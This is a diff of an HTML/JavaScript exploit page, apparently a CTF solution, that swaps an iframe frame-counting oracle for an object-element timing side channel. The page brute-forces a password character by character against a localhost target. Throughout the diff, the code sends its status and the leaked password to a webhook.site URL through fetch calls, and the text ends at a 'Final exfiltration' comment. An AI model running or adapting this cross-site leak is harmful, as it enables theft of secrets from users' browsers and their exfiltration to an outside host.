@@ -1,13 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head><title>Fixed Iframe Counting</title></head>
+<head><title>Object Timing Attack</title></head>
 <body>
-<h1>FIXED iframe frame counting attack...</h1>
+<h1>Object-based timing attack...</h1>
 <pre id="output"></pre>
-<div id="container" style="position:absolute;left:-9999px;"></div>
 <script>
 const output = document.getElementById('output');
-const container = document.getElementById('container');
 const TARGET = 'https://127.0.0.1:9999/';
 const CHARSET = '0123456789abcdef';
 let knownPassword = 'lebah';
@@ -17,131 +15,111 @@ function log(msg) {
     console.log(msg);
 }
 
-// DETERMINISTIC iframe frame counting (not timing-based!)
-async function testFrameCount(pass) {
-    return new Promise((resolve) => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
+// Object-based timing measurement (more reliable than iframe)
+function leak(pass) {
+    return new Promise(resolve => {
+        const start = performance.now();
+        const object = document.createElement('object');
+        object.width = '2000px';  // Important for timing difference!
+        object.height = '2000px';
+        object.data = TARGET + '?pass=' + encodeURIComponent(pass);
         
-        let resolved = false;
-        
-        const cleanup = () => {
-            if (iframe.parentNode) container.removeChild(iframe);
+        object.onload = () => {
+            object.remove();
+            const end = performance.now();
+            resolve(end - start);
         };
         
-        // Faster timeout for speed after oracle verification
-        const timeout = setTimeout(() => {
-            if (!resolved) {
-                cleanup();
-                resolved = true;
-                resolve({ pass, result: 'timeout', frameCount: null });
+        object.onerror = () => {
+            object.remove();
+            const end = performance.now();
+            resolve(end - start);
+        };
+        
+        // Timeout fallback
+        setTimeout(() => {
+            if (object.parentNode) {
+                object.remove();
+                const end = performance.now();
+                resolve(end - start);
             }
-        }, 1000); // Reduced to 1 second
+        }, 2000);
         
-        iframe.onload = () => {
-            // Minimal wait after onload
-            setTimeout(() => {
-                if (!resolved) {
-                    try {
-                        const frameCount = iframe.contentWindow.length;
-                        clearTimeout(timeout);
-                        cleanup();
-                        resolved = true;
-                        resolve({ pass, result: 'success', frameCount });
-                    } catch(e) {
-                        clearTimeout(timeout);
-                        cleanup();
-                        resolved = true;
-                        resolve({ pass, result: 'error', frameCount: null, error: e.message });
-                    }
-                }
-            }, 200); // Reduced to 200ms after onload
-        };
-        
-        iframe.onerror = () => {
-            if (!resolved) {
-                clearTimeout(timeout);
-                cleanup();
-                resolved = true;
-                resolve({ pass, result: 'onerror', frameCount: null });
-            }
-        };
-        
-        container.appendChild(iframe);
+        document.body.appendChild(object);
     });
 }
 
 async function leakPassword() {
-    log('[*] DETERMINISTIC iframe frame counting attack');
-    log('[*] Oracle: frameCount=1 means substring match, frameCount=0 means no match');
-    log('[*] Known prefix: ' + knownPassword + '\n');
+    log('[*] Object-based timing attack (justCTF technique)');
+    log('[*] Known prefix: ' + knownPassword);
     
-    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=iframe_fixed_started').catch(e=>{});
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=object_attack_started').catch(e=>{});
     
-    // First, verify the oracle works with known good/bad
-    log('[*] Verifying oracle...');
-    const testGood = await testFrameCount('lebah');
-    log(`  "lebah" (should be 1): frameCount=${testGood.frameCount}, result=${testGood.result}`);
+    // Calibrate timing threshold
+    log('\n[*] Calibrating timing threshold...');
     
-    const testBad = await testFrameCount('lebahZ');
-    log(`  "lebahZ" (should be 0): frameCount=${testBad.frameCount}, result=${testBad.result}`);
+    let foundTime = 0;
+    let notFoundTime = 0;
     
-    if (testGood.frameCount !== 1 || testBad.frameCount !== 0) {
-        log('\n❌ Oracle verification failed! Frame counting not working reliably.');
-        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?error=oracle_failed').catch(e=>{});
+    // Test known good (should be slow - has iframe)
+    for (let i = 0; i < 3; i++) {
+        foundTime += await leak('lebah');
+    }
+    foundTime /= 3;
+    
+    // Test known bad (should be fast - no iframe)
+    for (let i = 0; i < 3; i++) {
+        notFoundTime += await leak('lebahZ');
+    }
+    notFoundTime /= 3;
+    
+    const threshold = foundTime - ((foundTime - notFoundTime) / 2);
+    
+    log(`  Found (match): ${foundTime.toFixed(0)}ms`);
+    log(`  Not found: ${notFoundTime.toFixed(0)}ms`);
+    log(`  Threshold: ${threshold.toFixed(0)}ms`);
+    
+    if (notFoundTime >= foundTime) {
+        log('\n❌ Timing calibration failed! No clear difference detected.');
+        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?error=timing_calibration_failed').catch(e=>{});
         return;
     }
     
-    log('\n✅ Oracle verified! Proceeding with leak...\n');
+    log('\n✅ Timing calibration successful!\n');
     
-    // Leak characters in PARALLEL batches for speed
-    for (let pos = 0; pos < 8; pos++) { // 8 chars to fit in time
-        log(`[*] Position ${pos+1}/8...`);
+    // Leak characters (reduced to 4 for speed)
+    for (let pos = 0; pos < 4; pos++) { // Only 4 chars to fit in 30s
+        log(`[*] Position ${pos+1}/4...`);
         let found = false;
         
-        // Test in batches of 4 for speed
-        for (let i = 0; i < CHARSET.length; i += 4) {
-            const batch = [];
-            for (let j = 0; j < 4 && (i+j) < CHARSET.length; j++) {
-                batch.push(knownPassword + CHARSET[i+j]);
-            }
+        for (let c of CHARSET) {
+            const candidate = knownPassword + c;
             
-            log(`  Testing batch: ${batch.map(c => c[c.length-1]).join(', ')}`);
+            // Single measurement for speed
+            const avgTime = await leak(candidate);
             
-            // Test all 4 in parallel
-            const promises = batch.map(cand => testFrameCount(cand));
-            const results = await Promise.all(promises);
+            log(`  "${c}": ${avgTime.toFixed(0)}ms ${avgTime >= threshold ? '✓ MATCH!' : ''}`);
             
-            // Check results
-            for (let k = 0; k < results.length; k++) {
-                const result = results[k];
-                const char = batch[k][batch[k].length-1];
-                log(`    "${char}": frameCount=${result.frameCount}`);
+            if (avgTime >= threshold) {
+                knownPassword = candidate;
+                log(`  [+] Found '${c}' -> ${knownPassword}\n`);
                 
-                if (result.frameCount === 1) {
-                    knownPassword = batch[k];
-                    log(`  ✅ MATCH! Found '${char}' -> ${knownPassword}\n`);
-                    
-                    // Send progress
-                    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
-                    
-                    found = true;
-                    break;
-                }
+                // Send progress
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
+                
+                found = true;
+                break;
             }
-            
-            if (found) break;
         }
         
         if (!found) {
-            log(`  ❌ No match found at position ${pos+1}!`);
+            log(`  [-] No match at position ${pos+1}!`);
             break;
         }
     }
     
     log('\n========================================');
-    log('LEAKED PASSWORD (partial): ' + knownPassword);
+    log('LEAKED PASSWORD: ' + knownPassword);
     log('========================================');
     
     // Final exfiltration
